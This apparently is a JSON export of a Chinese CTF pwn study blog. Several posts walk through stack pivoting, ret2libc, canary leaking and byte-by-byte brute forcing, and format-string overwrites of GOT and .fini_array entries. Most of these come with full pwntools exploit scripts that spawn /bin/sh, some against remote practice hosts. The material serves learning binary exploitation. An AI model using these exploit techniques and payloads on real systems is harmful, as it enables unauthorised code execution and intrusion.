时，一般不需要严格保证栈对齐。 ​ 调用 system 或其他敏感函数时需要对齐 system 和其他 libc 函数可能会用到要求对齐的指令。 所以在调用 system 前通常会加一个单独的 ret gadget，来调整栈对齐。","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/tags/ctfshow/"},{"name":"ret2libc2_x64","slug":"ret2libc2-x64","permalink":"http://example.com/tags/ret2libc2-x64/"}]},{"title":"ciscn_2019_es_2","slug":"ciscn-2019-es-2","date":"2025-07-24T09:05:12.000Z","updated":"2025-07-29T01:46:04.949Z","comments":true,"path":"2025/07/24/ciscn-2019-es-2/","permalink":"http://example.com/2025/07/24/ciscn-2019-es-2/","excerpt":"","text":"很明显的栈溢出漏洞，但是可操作空间太小，只能覆盖到返回地址，所以要用栈迁移 有system函数，但是需要自己传参，小问题 分析题目可知，有两次输入，第一次输入可以用来泄露ebp的地址 1payload=b&quot;a&quot;*0x27+b&quot;b&quot; 第二次要根据这个泄露出来的地址去构造我我们的后门函数 先查看ebp距离s的实际距离（gdb动态调试查看） 相距0xffffcf18 - 0xffffcee0 &#x3D; 0x38 接着构造我们的后门函数 所以 123payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave) payload.ljust(0x28, b&#39;\\x00&#39;) 中使用 b&#39;\\x00&#39; 是为了确保字符串在 printf 输出时能够正确终止，并且避免引入不必要的非空字节干扰后续的栈操作。因此，b&#39;\\x00&#39; 不能随意替换。 解释一下leave ret指令的作用过程 leave mov esp, ebp:把esp移动到ebp-0x38的位置（ebp-0x38)其实就是aaaa的位置 pop ebp：把aaaa这一块pop出去了 ret pop eip:,把栈顶的system函数pop出去作为返回地址 脚本1234567891011121314151617181920from pwn import *#p=process(&quot;./ciscn_2019_es_2&quot;)p=remote(&quot;node5.buuoj.cn&quot;,25671)sys=0x08048400main=0xdeadbeefleave=0x080485FDp.recvuntil(b&quot;name?\\n&quot;)payload=b&quot;a&quot;*0x27+b&quot;b&quot;p.send(payload)p.recvuntil(b&quot;b&quot;)s=u32(p.recv(4))-0x38print(hex(s))payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave)p.sendline(payload)p.interactive() 收获栈空间是识别 123偏移量 │ 寄存器/标识符 | 地址 | 内容 &lt;-- 解释-------+------------------------------------------00:0000│ esp 0xffffced0 —▸ 0x80486ca ◂— dec eax /* &#x27;Hello, %s\\n&#x27; */ 0xffffced0: ESP 寄存器当前指向的内存地址。 —▸ 0x80486ca: ESP 指向的内存地址里存储的值，它又是一个地址，指向了 0x80486ca。 ◂— dec eax /\\* &#39;Hello, %s\\n&#39; \\*/: 对 0x80486ca 这个地址的反汇编&#x2F;注释，这里显示它是一条指令的起始，并且其附近有字符串 “Hello, %s\\n”。 要找到存放内容是111111的位置，就是11111直接指向的位置0xffffcee0 esp与s的距离一直疑惑不是相距0x28吗，为什么要看这个0x38,看了很多大佬的wp也没有说的，查了才知道还要考虑堆栈平衡:joy: 🧠 关键点在于： 1char s[0x28]; 这个数组虽然是 0x28 字节，但 它不是从 ebp - 0x28 到 ebp，而是从 ebp - 0x2c 到 ebp - 4。 也就是说，编译器会： 为变量 s[0x28] 分配 0x28 字节； 还会额外分配 对齐空间（padding），使整个栈帧是对齐的； 所以，真正变量起始地址是 ebp - 0x2c，不是 ebp - 0x28。 👉 在 32 位程序中，变量 char s[0x28] 通常从 ebp - 0x2c 开始，而不是 ebp - 0x28。 在 32 位程序里，esp 在建立栈帧时，常常是 为了给局部变量和返回地址对齐到 16 字节，因此会多分配几个字节； 所以 sub esp, 0x2c 是非常常见的； 即使变量只有 0x28 字节，编译器会额外多给 4 字节 padding，形成 0x2c。 在这里也可以看到它开辟了不止0x28个空间，所以才要gdb调试看它实际的 1234567891011121314151617181920212223242526272829303132333435 高地址 (栈底，向高地址增长) ^ |+-----------------+-------------------+| 函数参数 | |+-----------------+-------------------+| 返回地址 | | (调用 func() 后返回到这里的地址)+-----------------+-------------------+| 保存的旧 EBP | (OLD_SAVED_EBP) | &lt;- (0x080485FD - leave; ret 处的 EBP 值)+-----------------+-------------------+| Padding | (通常是 4 字节) | &lt;- (如果你说 s 从 ebp - 0x2c 开始，那么这部分是 ebp-0x2c 到 ebp-0x28 之间的填充)+-----------------+-------------------+ &lt;- **ebp - 0x28**| | || | || | || | || | || char s[0x28] | || | || | || | || | || | || | |+-----------------+-------------------+ &lt;- **ebp - 0x2c** (数组 s 的起始地址)| 其他局部变量 | || （如果有） | |+-----------------+-------------------+| ...... | |+-----------------+-------------------+| 当前 ESP | | &lt;- (ESP 寄存器指向的地址)+-----------------+-------------------+ | v 低地址 (栈顶，向低地址增长)","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"栈迁移","slug":"栈迁移","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"}]},{"title":"UPX手脱壳","slug":"UPX手脱壳","date":"2025-07-24T03:27:06.000Z","updated":"2025-07-24T03:27:06.337Z","comments":true,"path":"2025/07/24/UPX手脱壳/","permalink":"http://example.com/2025/07/24/UPX%E6%89%8B%E8%84%B1%E5%A3%B3/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"栈溢出进阶","slug":"栈溢出进阶","date":"2025-07-23T06:16:44.000Z","updated":"2025-07-30T07:43:39.541Z","comments":true,"path":"2025/07/23/栈溢出进阶/","permalink":"http://example.com/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/","excerpt":"","text":"栈迁移change_ebp（栈劫持Demo1） 最多填充12个字节，只能覆盖到ebp 写入的magic的范围到0x0804A380～0x0804A38C 所以栈迁移 脚本1234567891011121314from pwn import *p = process(&quot;./change_ebp&quot;)gdb.attach(p,&quot;b *0x080485D3&quot;)backdoor = 0x0804850Bmagic_addr = 0x0804A380p.recvuntil(&quot;leave your name\\n&quot;)payload = &quot;junk&quot; + p32(backdoor) + p32(magic_addr)p.send(payload)p.interactive() ebp 的作用在函数调用时，ebp 用于： 定位局部变量（如 v1 位于 ebp-8）。 在函数返回时恢复调用者的栈帧（通过 leave 指令）。 典型函数尾声（leave; ret）： 12leave ; 相当于 mov esp, ebp; pop ebpret ; pop eip，跳转到返回地址 leave 会： 把 ebp 的值赋给 esp（栈指针指向 ebp）。 然后 pop ebp（恢复调用者的 ebp）。 ret 会 pop eip（跳转到返回地址）。 (1) leave 指令的执行 mov esp, ebp： 原本 ebp 指向栈帧基址，但已经被覆盖为 magic_addr（0x0804A380）。 所以 esp 现在指向 magic_addr（全局变量 magic 的地址）。 pop ebp： 从 esp（magic_addr）弹出一个值到 ebp。 如果 magic 区域没有特殊构造，这里可能不重要。 (2) ret 指令的执行 pop eip： 从 esp（magic_addr + 4）弹出一个值到 eip（程序计数器）。 关键点： magic_addr + 4 是 magic 变量的第 5-8 字节。 攻击者已经通过 read(0, &amp;magic, 0xCu) 向 magic 写入了 12 字节数据。 如果 magic + 4 处存放的是 backdoor 地址，ret 就会跳转到 backdoor！ ret2libc3(栈劫持Demo2) 在这里介绍一种新的办法，使函数可以不返回main函数 脚本12345678910111213141516171819202122232425262728293031323334353637from pwn import *p = process(&quot;./ret2libc3&quot;)gdb.attach(p,&quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]gets_plt = elf.plt[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]# ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot;pop_ebp_ret = 0x080485db# ROPgadget --binary ./ret2libc3 | grep leaveleave_ret = 0x08048448rop_addr = 0x804a800p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = &quot;a&quot; * 0x108 + &quot;junk&quot;payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret)p.sendline(payload1)leak_addr = u32(p.recv(4))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = b&quot;A&quot; * 0x108 # 填充缓冲区payload2 += p32(system) # 调用 systempayload2 += p32(0) # 返回地址（不重要，因为直接拿 shell）payload2 += p32(binsh) # system 的参数p.sendline(payload2)p.interactive() 第一个paylaod1payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got) 输出gets的got表地址，方便寻找libc基址 然后p32(pop_ebp_ret)取出两个地址，一个放进ebp,一个放入eip(ret指令)，放进eip的也就是p32(gets_plt)，正好接上下一条指令继续执行。 1payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr) 调用gets的plt表，又产生了一个输入机会 1payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret) 把rop_addr - 4作为ebp，所以程序会跳转到这里 而rop_addr 的数据可以有payload2填入，精心构造即可 第二个paylaod填入了上面的返回地址，使程序进入system函数，再构造system函数的参数&#x2F;bin&#x2F;sh 就构造好了后门函数 x64的情况其实差不多，就是先传入参数 1234567891011121314151617181920212223242526272829303132333435from pwn import *p = process(&quot;./ret2libc3_x64&quot;)gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]gets_plt = elf.plt[&quot;gets&quot;]rop_addr = 0x601800# ROPgadget --binary ./ret2libc3_x64 --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x0000000000400783pop_rsp3 = 0x000000000040077d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; retp.recvuntil(&quot;ret2libc3_x64\\n&quot;)payload1 = &quot;a&quot; * 0x100 + &quot;junkjunk&quot;payload1 += p64(rdi) + p64(gets_got)payload1 += p64(puts_plt)payload1 += p64(rdi) + p64(rop_addr)payload1 += p64(gets_plt)payload1 += p64(pop_rsp3) + p64(rop_addr - 0x18)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.sendline(payload2)p.interactive() rbp_leave(栈劫持Demo3) v1存在栈溢出漏洞，但可输入的字符数太少 最多覆盖到返回地址处，无法直接rop 所以考虑用name来构造，然后用v1转过去 脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import *p = process(&quot;./rbp_leave&quot;)#gdb.attach(p,&quot;b *0x000000000040073F&quot;)elf = ELF(&quot;./rbp_leave&quot;)name_addr = 0x6010A0# ROPgadget --binary ./rbp_leave --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x4007c3rsi2 = 0x4007c1pop_rsp3 = 0x4007bd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret# ROPgadget --binary ./rbp_leave | grep leaveleave_ret = 0x4006f0 # leave ; retret = 0x4006f1read_input = 0x4006C7rop_addr2 = name_addr + 0x800name = p64(ret) *20name += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;])name += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input)name += p64(pop_rsp3) + p64(rop_addr2 - 0x18)p.sendafter(b&quot;leave your name\\n&quot;,name.ljust(0x400,b&quot;\\x00&quot;))payload1 = b&quot;a&quot; * 0x100payload1 += p64(name_addr - 8)payload1 += p64(leave_ret)p.sendafter(&quot;try to break it\\n&quot;,payload1)leak_addr = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;))libc=LibcSearcher(&quot;read&quot;,leak_addr)libc_base = leak_addr - libc.dump(&quot;read&quot;)libc.address = libc_baseprint(hex(libc.address))system = libc_base+libc.dump(&quot;system&quot;)binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.send(payload2)p.interactive() 第一个payload12name += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;]) 调用puts函数打印read的got表地址 123name += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input) 调用read函数，read的参数比较多，所以多用了几个寄存器，把从终端输入的数据放在p64(rop_addr2)的位置上 1name += p64(pop_rsp3) + p64(rop_addr2 - 0x18) 因为p64(pop_rsp3)有三个pop指令，所以有要空出足够的距离，防止把重要数据弹出了 第二个payload填补v1 12payload1 += p64(name_addr - 8)payload1 += p64(leave_ret) p64(name_addr - 8)：覆盖 RBP 目标：将 RBP 修改为 name_addr - 8。 为什么是 name_addr - 8？ leave 指令会执行 mov rsp, rbp，因此 rsp 将指向 name_addr - 8。 接下来的 ret 会从 name_addr（即 name 的起始地址）开始执行 ROP 链。 -8 的调整：因为 leave 之后会 pop rbp，rsp 会 +8，最终指向 name_addr。 第三个payload12payload2 = p64(rdi) + p64(binsh)payload2 += p64(system) 为第一个payload提供的read输入 综上所述 通过0和2构造完整的后门函数，然后通过1进入执行这个后门函数 脚本 如何选择合适的 rop_addr2？ 方法 1：使用 name 的扩展区域 如果 name 的大小是 0x400，可以选择 name_addr + 0x400 之后的地址（如 name_addr + 0x800）。 优点：简单直接，无需额外泄露地址。 缺点：需确保 name 区域足够大（或程序允许越界写入）。 方法 2：使用 libc 中的可写段 libc 中有许多可写区域（如 __malloc_hook、__free_hook 附近）。 步骤： 泄露 libc 基址（如通过 puts(read_got)）。 计算目标地址（如 libc_base + 0x3c4b00）。 优点：稳定，适合大型 ROP 链。 缺点：需要先泄露 libc 地址。 方法 3：使用堆（Heap） 如果程序调用了 malloc，堆地址可能可预测。 步骤： 泄露堆地址（如通过 puts(malloc_got)）。 选择堆块中的空闲区域。 优点：空间大，不易冲突。 缺点：需要堆泄露。 canary保护Canary的设计思想简单高效，就是在栈溢出发生的高危区域的尾部插入一个值，当函数返回时检测Canary的值是否发生了改变，从而判断是否发生栈溢出&#x2F;缓冲区溢出。 保护原理当程序启用Canary编译后 插入Canary值 12mov rax，qword ptr fs:[0x28]mov qword ptr[rbp-8]，rax 检查 1234moV rdx,QWORD PTR [rbp-0x8]xOr rdx,QWORD PTR fs:0x28je0x4005d7&lt;main+65&gt;call 0x400460&lt;_stack_chk_fail@plt&gt; 如果检测出Canary的值被修改过，则会运行到__stack_chk_fail函数。这个函数位于glibc中，默认情况下经过ELF的延迟绑定。也就是说，stack_chk_fail是一个外部函数，当程序没有开启FULL RELRO保护时，可以被GOT劫持攻击。攻击者可以先劫持stack_chk_fail函数的GOT，再触发Canary检测报错，这时就会进入劫持的地址，这也是一种利用思路 在 Linux x86-64 架构下，Canary（也称为 stack_guard 或栈保护值）通常并不是直接存储在栈上（那样它就容易被溢出），而是存储在一个线程本地存储 (TLS) 区域中。 在 x86-64 Linux 系统中，fs 寄存器（或者 gs 寄存器）被操作系统用于指向当前线程的线程本地存储 (TLS) 区域。 GCC 编译器在编译时，会在程序启动时初始化这个 Canary 值，并将其存储在 TLS 区域的一个特定偏移量上。 对于 x86-64 Linux，这个偏移量通常是 0x28。所以，fs:0x28 指向的内存地址就是当前线程的 stack_guard（即 Canary 值）的存储位置。 而且TLS中的值由函数security_init进行初始化 最后，注意Canary最后的一个字节会被设置为0，防止类似printf（”%s”,&amp;buf）形式的函数不小心将Canary的值打印出来，所以用“\\x00”字符（在C语言中表示字符串的结尾）来做一个截断，和ASLR没有关系。 栈结构 1234[ buf (256 bytes) ] ← esp+0x00[ stack canary (4 bytes) ] ← esp+0x100[ saved ebp (4 bytes) ][ return address (4 bytes)] 对于有Canary的程序，如果考虑栈溢出攻击，主要有下面4个思路： 1）利用泄露函数泄露出Canary的值，再进行利用。 2）爆破得到Canary的值。 3）__stack_chk_fail函数泄露关键信息。 4）修改TLS中的stack_guard值。 1.leak_canary（泄露Canary值） 脚本1（printf_替代&#x2F;x00）12345678910111213141516171819from pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b *0x08048631&quot;)main=0x0804867fbin= 0x080485CCpayload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary))payload=b&#x27;\\x00&#x27;*0x100+p32(canary)payload+=p32(0)*2payload+=p32(main)payload+=p32(bin)p.send(payload)p.interactive() 12345payload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary)) 用b替代canary最低位的\\x00,使得它的值可以被输出 然后用收到的数据减去b的值就是canary的值 1payload+=p32(0)*2 两个padding 分配了 0x118字节的栈空间给局部变量和padding。 栈空间一次性分配，便于管理和性能 编译器在函数入口会执行类似 sub esp, 0x118 的操作，一次性给函数所有局部变量、临时数据和对齐空间分配足够大的连续栈空间。分配的 280 字节是 buf + 其他局部变量 + padding 这块空间里包含你所有局部变量（比如 buf）、隐式变量（比如保存的寄存器）、以及为了满足 CPU 访问对齐需求而插入的 padding。 从ebp开辟了0x118个字节存放，但buf从ebp-0x10c开始存储，接着是canary，所以还有两个padding canary不一定是挨着缓冲区的，单在这道题是的 情况 会插 canary 紧挨数组吗？ 函数里有 char buf[xxx] ✅ 一般会放 canary 在 buf 后面 没有数组、不会栈溢出 ❌ 通常不会启用 canary 数组不在栈上（比如 malloc 的） ❌ 不是栈保护的范围 特殊优化或内联小函数 ⚠️ 可能被省略 虽然 canary 的位置不是硬编码的，但在实际场景中（特别是题目明确有 char buf[] 并开启了 canary），它通常 就在 buf 后面，且通过调试或试探可以准确确定它的偏移位置。 脚本2（格式化字符串）可以看到buf在第7个位置上 而且buf有256个字节，可以存放64个字符 所以canary就是在第64+7即71个参数的位置 123456789101112131415161718from pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b printf&quot;)target = 0x080485CCp1 = &quot;%71$p\\n&quot;p.send(p1)leak_info = p.recvuntil(&quot;\\n&quot;,drop = True)canary = int(leak_info,16)log.success(&quot;canary:&quot; + hex(canary))p2 = b&quot;\\x00&quot; * 0x100 + p32(canary)p2 += p32(0) * 3p2 += p32(target)p.send(p2)p.interactive() 2.one_by_one_bruteforce(逐个字节爆破)通过fork函数开启子进程交互的题目，因为fork函数会直接拷贝父进程的内存，所以每次创建的子进程的Canary是相同的。我们可以利用这个特点，逐个字节地将Canary爆破出来。 脚本123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *p = process(&quot;./one_by_one_bruteforce&quot;)def bruteforece1bit(): global known for i in range(256): p1 = &quot;a&quot; * 0x108 p1 += known p1 += chr(i) p.sendafter(&quot;one_by_one_bruteforce\\n&quot;,p1) try: info = p.recvuntil(&quot;\\n&quot;) if &quot;*** stack smashing detected ***:&quot; in info: p.send(&quot;n\\n&quot;) continue else: known += chr(i) break except: log.info(&quot;maybe there something wrong&quot;) breakdef bruteforce_canary(): global known known += &quot;\\x00&quot; for i in range(7): bruteforece1bit() if i != 6: p.send(&quot;n\\n&quot;) else: p.send(&quot;y\\n&quot;)context.log_level = &quot;debug&quot;target = 0x000000000040083Eknown = &quot;&quot;bruteforce_canary()canary = u64(known)log.success(&quot;canary:&quot; + hex(canary))p2 = &quot;a&quot; * 0x108 + p64(canary) + p64(0) + p64(target)p.sendafter(&quot;go\\n&quot;,p2)p.interactive() 逐字节尝试，无“stack smashing detected”报错回显来对Canary的数值进行逐字节爆破。如果输入正确，则没有回显，能得到Canary的这个字节，然后开始下一个字节的爆破；如果输入有误，则爆破不成功，继续下一个爆破的数值，爆破不成功时子进程会报错退出，但不会影响父进程，父进程会一直创建子进程，可以利用这一点实现爆破。得到Canary的具体数值后，可以在父进程进行栈溢出，覆盖返回地址，实现Getshell，也可以在子进程中实现Getshell。因为有了Canary的具体数值，所以可以绕过Canary保护机制 3.stack_smashesstack_smashes是一种特殊的利用思路。前面已经提到过，在_stack_chk_fail函数中会将_libc_argv[0]的信息打印出来， 例如(stack smashing detected : [程序名] terminated）如果能够控制__libc_argv[0]中保存的地址为我们想要的信息的地址，那么就能得到相应的数据。 在 Linux 系统中，程序名通常是通过读取 __libc_argv[0] 这个全局指针来实现的。__libc_argv 是 libc 库内部维护的一个指针数组，其中 __libc_argv[0] 指向当前进程的可执行文件路径字符串。 攻击者通过任意地址写入（通常通过 ROP 链实现）将 __libc_argv[0] 这个指针的值，从原来的程序名地址，修改为我们想要泄露的数据的地址（例如 flag 的地址）。 🔍 main 函数的标准原型 1int main(int argc, char *argv[], char *envp[]); argc: 命令行参数个数 argv: 参数字符串数组指针 envp: 环境变量字符串数组指针 在栈上，这些参数是由 __libc_start_main 调用 main 时传入的。 所以查看buf的地址 直接下断点到read的位置，看到buf的位置是0x7fffffffdc00 接着查看libc_argc[1],即文件信息 0x7fffffffde18 计算好偏移之后就可以把libc_argc[0]的地址换为flag的地址了 脚本12345678910from pwn import *p = process(&quot;./stack_smashes&quot;)#gdb.attach(p,&quot;b *0x0000000000400875&quot;)context.log_level = &quot;debug&quot;flag_addr = 0x0601090p2 = &quot;a&quot; * 0x218 + p64(flag_addr)p.sendafter(&quot;stack_smashes\\n&quot;,p2)p.interactive() 还有就是直接把stack_chk_fail函数的get表村的地址改为后门函数的地址 偏移是6 脚本12345678910111213from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,word_size=&#x27;64&#x27;)p=remote(&quot;node5.buuoj.cn&quot;,25904)#p = process(&quot;./r2t4&quot;)elf = ELF(&quot;./r2t4&quot;)backdoor = 0x400626#__stack_chk_fail_got_addr = elf.got[&quot;__stack_chk_fail&quot;]__stack_chk_fail = elf.got[&#x27;__stack_chk_fail&#x27;]payload = fmtstr_payload(6, &#123;__stack_chk_fail: backdoor&#125;).ljust(0x38,b&#x27;a&#x27;)p.sendline(payload)p.interactive() 总结来说，ljust(0x38, b’a’) 的目的是： 确保 read 函数读取到完整的、由我们控制的 56 字节数据。 防止 read 函数读取到其他不可预测的数据，从而干扰 printf 的行为。","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"ciscn_2019_sw_1","slug":"ciscn-2019-sw-1","date":"2025-07-22T11:58:20.000Z","updated":"2025-07-22T13:31:56.361Z","comments":true,"path":"2025/07/22/ciscn-2019-sw-1/","permalink":"http://example.com/2025/07/22/ciscn-2019-sw-1/","excerpt":"","text":"存在system函数，不需要泄露libc的地址 直接把printf的got表地址覆盖为system函数的地址，然后传递参数为“&#x2F;bin&#x2F;sh”即可 而且偏移是4 但是该格式化字符串漏洞只被执行了一次，无法实现操作 所以要修改收尾函数的地址以实现对格式化字符串漏洞的多次调用 用readelf去找fini_array的地址 脚本 1234567891011121314151617181920212223242526272829from pwn import *from LibcSearcher import LibcSearcher#p=process(&quot;./ciscn_2019_sw_1&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29318)elf=ELF(&quot;./ciscn_2019_sw_1&quot;)fini=0x0804979cprintf=elf.got[&quot;printf&quot;]main=0x08048534sys=0x080483D0sys_h=(sys&gt;&gt;16)&amp;0xffffsys_l=sys&amp;0xffffmain_h=(main&gt;&gt;16)&amp;0xffffmain_l=main&amp;0xffffpayload=p32(fini+2)+p32(printf+2)+p32(printf)+p32(fini)payload+=b&quot;%&quot;+bytes(str(main_h-16),&quot;utf_8&quot;)+b&quot;c%4$hn&quot;payload+=b&quot;%5$hn&quot;payload+=b&quot;%&quot;+bytes(str(sys_l-main_h),&quot;utf_8&quot;)+b&quot;c%6$hn&quot;payload+=b&quot;%&quot;+bytes(str(main_l-sys_l),&quot;utf_8&quot;)+b&quot;c%7$hn&quot;payload += b&#x27;\\x00&#x27;p.sendlineafter(b&quot;name?\\n&quot;,payload)payload=b&quot;/bin/sh&quot;p.sendlineafter(b&quot;name?\\n&quot;,payload)p.interactive() 注意 四个写入的数是递增的 如何取高 16 位 地址右移 16 位：system_plt &gt;&gt; 16 把高 16 位“移到”最低位 对于 0x080483d0： 10x080483d0 &gt;&gt; 16 = 0x0804 为什么还要 &amp; 0xffff？ 因为高 16 位虽然已经移到低位了，但 Python 整数没有“溢出”概念。 为了确保最终结果只保留低 16 位（即最大不超过 0xffff），就用掩码 0xffff 取最低 16 位。 1b&#x27;%&#x27; + bytes(str(xxx), &quot;utf-8&quot;) + b&#x27;c%4$hn&#x27; 这里的含义是： 这串字符串拼接后是啥样？举个例子，假设 xxx &#x3D; 100，拼接结果是： 1b&#x27;%100c%4$hn&#x27; 这在格式化字符串里的意思%100c ：向输出缓冲区写入 100个空格字符，使得“已经输出字符数”加100。 %4$hn ：把当前的输出字符数（现在应该是前面已有字符数 + 100）写入 第4个参数指向的地址，写入2字节。 为什么不用 %n 直接写 4 字节？（两个字节用hn,四字节用n） 理论上可以直接用 %n 一次写完整 4 字节（一个 int），但是： 1️⃣ 数字范围的问题 如果你想写的数是： 12复制编辑0x08048534 那就是：134513204（十进制），而格式化字符串里的输出字符数必须刚好是这个数才能写出来。 你需要输出 134,513,204 个字符才能让 %n 写出这个数……显然不现实，程序很可能崩溃或超时。 fini.array更改原理🛡️ 1️⃣ RELRO 与各段的可写性 ELF 程序里有这几个关键的表&#x2F;段： 段&#x2F;表 正常作用 为什么能写 RELRO保护后的变化 .got.plt 存储动态链接函数的真实地址（lazy binding后） lazy binding 需要写入真实地址 NO RELRO 时可写，PARTIAL RELRO 也可写，FULL RELRO 时不可写 .init_array 程序启动时调用的函数数组 存函数指针 NO RELRO 时可写，PARTIAL&#x2F;FULL 时不可写 .fini_array 程序退出时调用的函数数组 存函数指针 NO RELRO 时可写，PARTIAL&#x2F;FULL 时不可写 ✨✅ .fini_array 存的是退出时要调用的函数指针。✅ 利用时先把 .fini_array=main，退出时重启 main，给你多一次利用机会。✅ 通常 .fini_array 只有一个指针的位置，只能写一个。 🔁 为什么 .fini_array 能帮忙 因为： 1️⃣ 程序退出时，libc 会主动去遍历 .fini_array，执行里面的函数指针。 2️⃣ 默认 .fini_array[0] 指向某个收尾函数。 3️⃣ 如果你把 .fini_array[0] 改成 main 的地址，那程序在退出时就会再一次调用 main，相当于重启了程序。 收尾函数、是程序退出（或结束）前，操作系统或运行时环境会调用这些函数来做善后工作。 流程大致是： 1main 函数执行 → main 返回 → 运行时开始调用“收尾函数” → 资源释放完毕 → 程序完全退出 sendlineafter() vs sendafter() 的区别 函数 行为 是否自动加 \\n 适用场景 sendlineafter() 等待特定字符串出现后发送数据，自动在末尾加 \\n（换行符） ✅ 是 适用于需要换行符的交互（如 scanf、gets、fgets） sendafter() 等待特定字符串出现后发送数据，不自动加 \\n ❌ 否 适用于不需要换行符的交互（如 read、recv） 在这里我们是用scanf读取数据，它在读取到&#x2F;n时才会停止，所以要用sendlineafter()","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"格式化字符串","slug":"格式化字符串","date":"2025-07-21T01:05:48.000Z","updated":"2025-07-25T13:13:06.301Z","comments":true,"path":"2025/07/21/格式化字符串/","permalink":"http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"原理格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。 通俗来说，格式化字符串函数的作用是将计算机内存中的数据转化为人类可读的字符串格式。 一般来说，格式化字符串在利用的时候主要分为三个部分： (1）格式化字符串函数。 (2）格式化字符串。 (3）后续参数，可选。 用printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalary） printf函数叫作格式化字符串函数，”name:%s,age:%d,salary:%4.2f”叫作格式化字符串，“myname,myage,mysalary”叫作后续参数。 🧱 常见的格式化字符串符号 格式符 作用 示例 %x&#x2F;%p 以十六进制形式输出栈上的值 %x→0xdeadbeef %p通常带0x前缀 %d&#x2F;%u 以十进制输出栈上的值 %d→3735928559 %c 输出栈上值的最低一个字节 %c→&#39;A&#39; %s 把栈上的值当作地址，输出该地址的字符串 %s→&quot;Hello&quot; %hn 写入 2 字节（short） %hn→ 写入低 2 字节 %hhn 写入 1 字节（char） %hhn→ 写入低 1 字节 %n 将已输出字符数写入栈上的地址 %n→ 写入0x4到指定地址 %$p&#x2F;%%$s 指定第几个参数位置的值 %4$p→ 第 4 个参数 %% 输出一个%字符本身 %%→% 当用户控制了 printf() 